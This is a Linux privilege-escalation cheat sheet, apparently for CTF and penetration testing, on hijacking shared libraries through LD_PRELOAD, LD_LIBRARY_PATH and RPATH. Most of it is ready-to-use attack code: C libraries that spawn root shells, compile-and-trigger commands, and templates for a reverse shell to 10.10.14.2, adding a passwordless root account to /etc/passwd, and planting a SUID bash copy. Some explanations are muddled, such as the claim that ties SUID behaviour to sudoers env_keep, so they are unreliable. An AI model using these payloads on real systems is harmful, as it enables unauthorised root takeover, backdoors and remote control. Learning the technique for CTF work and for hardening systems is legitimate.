## Shared Library Privilege Escalation

Linux resolves shared libraries at runtime in a defined search order. If any point in that order can be influenced by a low-privilege user, a malicious library can be injected and executed with the privileges of the calling process. When that process runs as root via sudo, the result is a root shell. 

***

## Library Resolution Order

When a program executes, the linker searches for required libraries in this exact order: 

```
1. RPATH embedded in the binary (set at compile time)
2. LD_LIBRARY_PATH environment variable
3. RUNPATH embedded in the binary
4. /etc/ld.so.conf (and files in /etc/ld.so.conf.d/)
5. Default system directories: /lib, /lib64, /usr/lib, /usr/lib64
```

The attack surface is any of these locations that a non-root user can write to or control.

***

## Reconnaissance

```bash
# List shared libraries a binary depends on
ldd /bin/ls
ldd /usr/sbin/apache2

# Check RPATH baked into a binary
readelf -d /usr/local/bin/suid-binary | grep -i rpath
objdump -x /usr/local/bin/suid-binary | grep RPATH

# Check sudo config for env_keep (the key condition for LD_PRELOAD)
sudo -l
# Look for:
# env_keep+=LD_PRELOAD
# env_keep+=LD_LIBRARY_PATH

# Find writable directories in the library search path
find /lib /usr/lib /usr/local/lib -writable 2>/dev/null
ls -la /etc/ld.so.conf.d/
```

***

## Attack Vector 1: LD_PRELOAD via sudo env_keep

This is the most common variant seen in CTF environments and real misconfigurations. It requires two conditions to both be true: `env_keep+=LD_PRELOAD` must appear in the sudo defaults, and the user must have any sudo permission at all. 

```
sudo -l output:
    Defaults env_reset, env_keep+=LD_PRELOAD
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Even though `apache2 restart` is not a GTFOBin and cannot directly spawn a shell, `LD_PRELOAD` is preserved when running it with sudo, meaning the linker will load your library first before any of apache2's own libraries.

### Malicious Library

```c
// root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // prevent recursive loading
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

`_init()` is called automatically by the dynamic linker as soon as the shared object is loaded, before the program's `main()` ever runs.

### Compile and Execute

```bash
# Compile as a position-independent shared object with no standard startup files
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles

# Trigger via any available sudo command
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

# Any sudo-allowed binary works:
sudo LD_PRELOAD=/tmp/root.so /usr/bin/find
sudo LD_PRELOAD=/tmp/root.so /usr/bin/vim
```

***

## Attack Vector 2: LD_LIBRARY_PATH via sudo env_keep

If `env_keep+=LD_LIBRARY_PATH` is set instead of (or in addition to) `LD_PRELOAD`, the approach changes slightly. You drop a malicious `.so` named after a real dependency into a directory you control, then point `LD_LIBRARY_PATH` at that directory. The linker finds your version before the real one. 

```bash
# Step 1: Find a library that the sudo-allowed binary depends on
ldd /usr/sbin/apache2
# libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3

# Step 2: Create a malicious library with the same name
cat << 'EOF' > /tmp/libpcre.so.3.c
#include <stdlib.h>
#include <unistd.h>
void pcre_exec() {
    setuid(0); setgid(0); system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/libpcre.so.3 /tmp/libpcre.so.3.c -nostartfiles

# Step 3: Run with LD_LIBRARY_PATH pointing to your directory
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 restart
```

***

## Attack Vector 3: RPATH Hijacking

When a binary has an RPATH pointing to a directory that is writable by your user, you can drop a library there and it will be loaded first, before everything else in the search order. 

```bash
# Find SUID binaries with RPATH
find / -perm -4000 -type f 2>/dev/null | while read f; do
    readelf -d "$f" 2>/dev/null | grep -q RPATH && echo "$f"
done

# Check RPATH value
readelf -d /usr/local/bin/suid-prog | grep RPATH
# 0x000000000000000f (RPATH) Library rpath: [/development]

# Check if that directory is writable
ls -la /development

# Find what library the binary tries to load from there
ldd /usr/local/bin/suid-prog
# libshared.so => not found

# Create the missing malicious library
cat << 'EOF' > /development/libshared.c
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    setuid(0); setgid(0); system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /development/libshared.so /development/libshared.c

# Execute the SUID binary normally - your library loads automatically
/usr/local/bin/suid-prog
```

The `__attribute__((constructor))` decorator is a cleaner alternative to `_init()` and works reliably across modern GCC versions. 

***

## Malicious Library Templates

```c
// Template 1: _init() - fires on library load, simple reverse shell
void _init() {
    unsetenv("LD_PRELOAD");
    system("bash -i >& /dev/tcp/10.10.14.2/9001 0>&1");
}

// Template 2: constructor attribute - add root user to /etc/passwd
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) pwn() {
    setuid(0); setgid(0);
    system("echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd");
}

// Template 3: SUID bash copy
void __attribute__((constructor)) suid() {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
// After the binary runs, execute: /tmp/rootbash -p
```

***

## Technique Summary

| Vector | Condition | How |
|---|---|---|
| `LD_PRELOAD` | `env_keep+=LD_PRELOAD` in sudoers | Compile `.so` with `_init()`, pass via sudo |
| `LD_LIBRARY_PATH` | `env_keep+=LD_LIBRARY_PATH` in sudoers | Drop `.so` named after a real dependency, point path at it |
| RPATH hijack | RPATH in SUID binary points to writable dir | Drop `.so` with the expected name into that directory |
| Writable `/lib` or `/usr/lib` | Write access to system library directories | Replace a real `.so` used by a root-run process |

The `LD_PRELOAD` and `LD_LIBRARY_PATH` variables are completely ignored by the dynamic linker for SUID/SGID binaries unless `env_keep` explicitly preserves them in the sudoers file, which is what makes that configuration a misconfiguration rather than a feature. 
